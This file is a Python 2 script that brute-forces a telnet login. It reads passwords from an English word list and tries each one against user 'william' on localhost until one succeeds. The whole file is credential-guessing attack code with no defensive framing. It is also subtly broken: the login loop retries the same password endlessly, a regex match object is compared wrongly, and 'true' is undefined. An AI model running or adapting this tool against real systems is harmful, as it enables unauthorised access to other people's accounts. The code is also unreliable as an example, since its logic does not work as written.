#!/usr/bin/python

import telnetlib

HOST = 'localhost'
USER = 'william'
LOGIN_TIMEOUT = 5
AUTH_TIMEOUT = 10
AUTH_REPLIES = ['\\$ ', 'TODO INCORRECT LOGIN CHECK']

def print_indented_string(indentation, s):
	print (indentation + '"'
		+ s.replace('\n', '\n' + indentation)
		+ '"')

class TelnetConnection(object):
	def __init__(self, password):
		self.host = HOST
		self.username = USER
		self.password = password
		self.valid = False

		self.connect()

	def connect(self):
		self.telnet = telnetlib.Telnet(HOST)		

	def read_until(self, expected, timeout):
		output = self.telnet.read_until(expected, timeout)
		print_indented_string('\t\t', output)
		return output.endswith(expected)

	def check_login_status(self):
		index, match, text = self.telnet.expect(AUTH_REPLIES, AUTH_TIMEOUT)
		self.valid = match and (match.group in AUTH_REPLIES)

	def attempt_login(self):
		self.connect()

		if not self.read_until('login: ', LOGIN_TIMEOUT):
			return False

		self.telnet.write(self.username + '\n')

		if not self.read_until('Password: ', LOGIN_TIMEOUT):
			return False

		self.telnet.write(self.password + '\n')
		self.check_login_status()
		
		return True

		
	def login(self):
		while self.attempt_login():
			pass


f = open("american-english", "r")
done = False
line = ""

while not done:
	password = f.readline().strip()

	print "* Starting attempt on '" + password + "'..." 

	conn = TelnetConnection(password)
	conn.login()

	if conn.valid:
		print("<< Found successful password '" + password + "' ! >>")
		done = true



